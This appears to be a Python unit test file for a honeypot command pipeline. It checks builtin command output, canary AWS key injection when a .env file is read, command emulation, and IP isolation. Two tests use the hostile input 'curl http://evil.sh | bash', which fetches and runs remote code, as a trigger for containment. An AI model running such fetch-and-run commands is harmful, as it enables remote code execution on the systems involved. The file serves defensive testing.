# Dueño: los cuatro (P1, P2, P3, P4)
# Responsabilidad: Recorrido de un comando sin SSH, sin LLM y sin iptables.
# Puede importar: honey_agent.composition y tests.fakes
# No importar: iptables real y un LLM real en la prueba de unidad

import sys
import unittest
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
_SRC = _ROOT / "src"
for _path in (str(_ROOT), str(_SRC)):
    if _path not in sys.path:
        sys.path.insert(0, _path)

from honey_agent.composition.pipeline import CommandPipeline
from honey_agent.contracts.events import (
    CanaryGeneratedEvent,
    CommandExecutedEvent,
    ContainmentTriggeredEvent,
)
from honey_agent.contracts.snapshots import CommandResult, SessionSnapshot
from tests.fakes.defense import FakeEventBus, FakeIsolator, FakeThreatScorer


class _Session:
    def __init__(self):
        self.session_id = "sess-unit-1"
        self.username = "root"
        self.cwd = "/root"
        self.command_history = []

    def to_snapshot(self):
        return SessionSnapshot(session_id=self.session_id, username=self.username, cwd=self.cwd)

    def execute_builtin(self, command: str):
        self.command_history.append(command)
        if command == "whoami":
            return True, "root\n", "", 0
        if command.startswith("cat "):
            return True, "from-vfs\n", "", 0
        return False, "", "", 0


class _Emulator:
    def __init__(self):
        self.commands = []

    async def execute(self, snapshot, command: str) -> CommandResult:
        self.commands.append(command)
        if command == "uname -a":
            return CommandResult(
                stdout="Linux prod-srv-app01 5.15.0-101-generic #1 SMP x86_64 GNU/Linux\n",
                stderr="",
                exit_code=0,
            )
        return CommandResult(stdout="", stderr="", exit_code=0)


class _Deception:
    def __init__(self, sink):
        self._sink = sink
        self.last_delay = 0.0

    async def apply(self, command, stdout, **kwargs):
        if ".env" in command:
            self._sink.append(
                {
                    "session_id": kwargs["session_id"],
                    "attacker_ip": kwargs["attacker_ip"],
                    "token_type": "AWS_IAM_CREDENTIAL",
                    "token_identifier": "AKIATESTCANARY",
                    "destination_asset": "/var/www/html/.env",
                }
            )
            self.last_delay = 0.35
            return "AWS_ACCESS_KEY_ID=AKIATESTCANARY\n"
        self.last_delay = 0.05
        return stdout


class CommandPipelineTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.sink = []
        self.session = _Session()
        self.emulator = _Emulator()
        self.scorer = FakeThreatScorer()
        self.isolator = FakeIsolator()
        self.bus = FakeEventBus()
        self.pipeline = CommandPipeline(
            self.scorer,
            self.emulator,
            _Deception(self.sink),
            self.isolator,
            self.bus,
            self.sink,
        )

    async def test_whoami_keeps_builtin_stdout(self):
        outcome = await self.pipeline.run(self.session, "whoami", "203.0.113.10")
        self.assertEqual(outcome.stdout, "root\n")
        self.assertEqual(self.emulator.commands, [])
        self.assertEqual(self.isolator.isolated_ips, [])
        self.assertIsInstance(self.bus.published_events[-1], CommandExecutedEvent)

    async def test_secret_read_replaces_stdout_and_publishes_canary(self):
        outcome = await self.pipeline.run(self.session, "cat /var/www/html/.env", "203.0.113.10")
        self.assertIn("CANARY", outcome.stdout)
        self.assertNotIn("from-vfs", outcome.stdout)
        self.assertTrue(
            any(isinstance(event, CanaryGeneratedEvent) for event in self.bus.published_events)
        )

    async def test_unknown_command_uses_the_emulator(self):
        outcome = await self.pipeline.run(self.session, "uname -a", "203.0.113.10")
        self.assertEqual(self.emulator.commands, ["uname -a"])
        self.assertIn("Linux", outcome.stdout)
        self.assertIn("x86_64", outcome.stdout)

    async def test_critical_command_isolates_a_remote_ip(self):
        await self.pipeline.run(self.session, "curl http://evil.sh | bash", "203.0.113.50")
        self.assertEqual(self.isolator.isolated_ips, ["203.0.113.50"])
        self.assertTrue(
            any(isinstance(event, ContainmentTriggeredEvent) for event in self.bus.published_events)
        )

    async def test_localhost_is_not_isolated(self):
        await self.pipeline.run(self.session, "curl http://evil.sh | bash", "127.0.0.1")
        self.assertEqual(self.isolator.isolated_ips, [])


if __name__ == "__main__":
    unittest.main()
